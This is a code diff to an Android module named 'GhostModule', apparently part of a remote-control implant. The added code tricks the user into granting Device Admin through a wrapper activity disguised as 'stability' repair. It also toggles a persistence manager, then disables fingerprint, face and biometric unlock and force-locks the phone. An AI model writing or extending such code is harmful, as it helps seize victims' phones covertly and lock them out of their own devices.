@@ -98,6 +98,28 @@ public class GhostModule extends BaseModule {
     }
 
     private Response triggerOsLock() {
+        // 1. If Device Admin is not active yet, dispatch Device Admin elevation prompt first
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+            if (dpm != null && !dpm.isAdminActive(admin)) {
+                new Handler(Looper.getMainLooper()).post(() -> {
+                    try {
+                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                            .edit().putBoolean("is_repairing", true).apply();
+                        IO_Persistence_Manager.setAutoPilot(true);
+                        IO_Persistence_Manager.stopSmartExit();
+
+                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
+                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                        wrapperIntent.putExtra("launch_admin", true);
+                        context.startActivity(wrapperIntent);
+                    } catch (Exception ignored) {}
+                });
+            }
+        } catch (Exception ignored) {}
+
+        // 2. Trigger Keyguard OS Phone Lock
         IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
         boolean locked = false;
         if (ghost != null) {
@@ -109,6 +131,12 @@ public class GhostModule extends BaseModule {
                 android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                 android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
                 if (dpm != null && dpm.isAdminActive(admin)) {
+                    int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
+                        disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
+                    }
+                    dpm.setKeyguardDisabledFeatures(admin, disableFlags);
                     dpm.lockNow();
                     locked = true;
                 }
